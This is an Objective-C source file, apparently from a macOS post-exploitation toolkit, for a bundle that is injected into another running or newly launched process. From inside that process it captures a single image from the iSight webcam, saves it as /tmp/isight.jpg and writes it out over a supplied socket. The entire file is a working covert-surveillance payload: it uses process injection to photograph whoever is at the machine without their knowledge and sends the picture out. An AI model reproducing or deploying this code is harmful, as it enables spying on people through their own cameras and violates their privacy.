/**********************************************************************
 * NAME
 *
 *      isight -- An injectable bundle to capture an image from the
 *      attached iSight video camera.
 *
 * SYNOPSIS
 *      inject-bundle isight <pid>
 *      inject-bundle isight <cmd> [ <args> ... ]
 *      run-bundle isight
 *
 * DESCRIPTION
 *      This bundle is meant to be injected into a running or newly
 *      launched process by inject-bundle.  It will capture a single
 *      image from the iSight video camera and store it as
 *      /tmp/isight.jpg.
 *
 *      This bundle uses Tim Omernick's CocoaSequence Grabber from
 *      MacFUSE procfs.  
 *
 * LICENSE
 *      Due to inclusion of GPL-licensed code, this bundle is also
 *      licended under the GNU Public License.
 *
 **********************************************************************/

#import "CocoaSequenceGrabber.h"

BOOL shouldKeepRunning = YES; 

/*
 * This delegate handles the didReceiveFrame callback from CSGCamera,
 * which we use to convert the image to a JPEG.
 */
@interface CSGCameraDelegate : CSGCamera
{
    CFMutableDataRef data;
}

/*
 * Assign a CFMutableDataRef to receive JPEG image data
 */
- (void)setDataRef:(CFMutableDataRef)dataRef;

/*
 * Convert captured frame into a JPEG datastream, stored in a CFDataRef
 */
- (void)camera:(CSGCamera *)aCamera didReceiveFrame:(CSGImage *)aFrame;

@end

@implementation CSGCameraDelegate

- (void)setDataRef:(CFMutableDataRef)dataRef
{
    data = dataRef;
}

- (void)camera:(CSGCamera *)aCamera didReceiveFrame:(CSGImage *)aFrame;
{
    // First, we must convert to a TIFF bitmap
    NSBitmapImageRep *imageRep = 
        [NSBitmapImageRep imageRepWithData: [aFrame TIFFRepresentation]];
    
    NSNumber *quality = [NSNumber numberWithFloat: 0.1];
    
    NSDictionary *props = 
        [NSDictionary dictionaryWithObject:quality
                      forKey:NSImageCompressionFactor];

    // Now convert TIFF bitmap to JPEG compressed image
    NSData *jpeg = 
        [imageRep representationUsingType: NSJPEGFileType properties:props];

    // Store JPEG image in a CFDataRef
    CFIndex jpegLen = CFDataGetLength((CFDataRef)jpeg);
    CFDataSetLength(data, jpegLen);
    CFDataReplaceBytes(data, CFRangeMake((CFIndex)0, jpegLen), 
        CFDataGetBytePtr((CFDataRef)jpeg), jpegLen);

    // Stop the camera and signal that we should exit the run loop    
    [aCamera stop];
    shouldKeepRunning = NO;
}

@end

void run(int socket)
{
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    
    /*
     * Use CocoaSequenceGrabber to capture a single image from the
     * iSight camera and store it as a JPEG data stream in picture.
     */
    CFMutableDataRef picture = CFDataCreateMutable(NULL, 0);
    CSGCameraDelegate *delegate = [[CSGCameraDelegate alloc] init];
    [delegate setDataRef:picture];
    
    CSGCamera *camera = [[CSGCamera alloc] init];
    [camera setDelegate:delegate];
    [camera startWithSize:NSMakeSize(640, 480)];

    /*
     * Execute RunLoop until global flag is cleared
     */
    NSRunLoop *theRL = [NSRunLoop currentRunLoop];
    while (shouldKeepRunning && [theRL runMode:NSDefaultRunLoopMode 
                                       beforeDate:[NSDate distantFuture]]);

    /*
     * Write out picture to to socket
     */
    if (socket > 0) {
        size_t len = CFDataGetLength(picture);
        write(socket, &len, sizeof(len));
        write(socket, CFDataGetBytePtr(picture), len);
    }
    [pool release];
}
